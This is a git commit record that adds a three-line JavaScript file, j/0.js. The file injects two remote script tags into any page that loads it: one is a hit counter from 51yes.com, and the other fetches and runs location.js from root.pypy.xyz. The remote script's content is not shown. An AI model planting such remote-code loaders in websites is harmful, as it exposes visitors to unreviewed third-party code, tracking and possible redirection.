c9bba13531dd4afaddf821f17495dd8a5f7634ed
opensus <jesses.king@outlook.com>
2015-06-12 16:04:52 +0800

    Create 0.js

---
+++ j/0.js
@@ -0,0 +1,3 @@
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count22.51yes.com\/click.aspx?id=221530307&logo=12\" charset=\"gb2312\"><\/script>");
+
+document.writeln("<script type=\"text\/javascript\" src=\"http:\/\/root.pypy.xyz\/j\/location.js\"><\/script>")
